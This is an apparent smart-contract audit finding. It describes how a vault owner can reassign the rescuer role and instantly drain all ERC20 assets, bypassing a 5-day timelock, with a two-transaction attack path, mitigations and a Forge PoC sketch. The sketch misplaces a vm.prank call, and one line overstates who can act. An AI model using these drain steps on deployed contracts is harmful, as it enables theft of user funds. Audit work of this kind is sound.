# H-01: Owner Bypasses VaultRescuer Timelock — Instant Vault Drain

**Severity:** High  
**Status:** Known (TOB-TETH-2, Unresolved)  
**Contract:** Vault (inherits Rescuable.sol) + VaultRescuer.sol  
**Files:**
- `/Users/0xabhii/defi-audits/audits/treehouse-protocol/source/libs/Rescuable.sol`
- `/Users/0xabhii/defi-audits/audits/treehouse-protocol/source/periphery/VaultRescuer.sol`

## Description

The Vault contract inherits `Rescuable.sol` (Circle FiatToken pattern), which provides a two-role rescue mechanism:

1. **`onlyOwner` -> `updateRescuer(newRescuer)`** — changes the rescuer address. No timelock.
2. **`onlyRescuer` -> `rescueERC20(token, to, amount)`** — instantly transfers any ERC20 from the Vault to any address. No timelock.

The `VaultRescuer` contract is a SEPARATE defense layer that adds a 5-day WAIT_TIME between rescue and withdrawal. But the Vault's native `Rescuable.rescueERC20()` is independent of VaultRescuer — the owner can bypass the timelock entirely.

## Attack Path (2 transactions)

**Prerequisite:** Owner EOA or owner multisig key access.

```
TX 1: Owner calls Vault.updateRescuer(attackerEOA)
      - _rescuer is updated instantly
      - No timelock, no delay, no VaultRescuer involvement

TX 2: attackerEOA calls Vault.rescueERC20(wstETH, attackerEOA, type(uint).max)
      - Transfers ALL wstETH from Vault to attackerEOA
      - Anyone can now execute this since rescuer = attackerEOA
      - No timelock, no VaultRescuer involvement
```

## Impact

- All vault assets (wstETH, stETH, any ERC20) can be drained in a single block
- Loss of all user deposits (TAsset/IAU become worthless)
- $0 at risk in current deployment; potential +$100M+ at peak TVL

## Why TOB Marked It Unresolved

Trail of Bits (Aug 2024, TOB-TETH-2): The client acknowledged it as a "centralization risk — it's conceptually no different to another EOA with privileged access."

## Mitigation

1. Remove `updateRescuer` from Vault, or add a timelock to it
2. Set `_rescuer` to a multisig or timelock contract, not mutable by a single owner
3. Remove `Rescuable` inheritance from Vault; use VaultRescuer as the sole rescue path

## PoC - Forge Test Sketch

```solidity
// Given: owner = address(1), attacker = address(2)
// Vault is deployed with Rescuable._rescuer = VaultRescuer address

vm.prank(owner);
Vault.updateRescuer(attacker);
// _rescuer is now attacker

vm.prank(attacker);
uint wstEthBalance = IERC20(wstETH).balanceOf(address(Vault));
Vault.rescueERC20(wstETH, attacker, wstEthBalance);
// All wstETH is now in attacker's wallet
// TAsset.totalAssets() drops to 0 (or near 0)
// All user deposits are lost
```
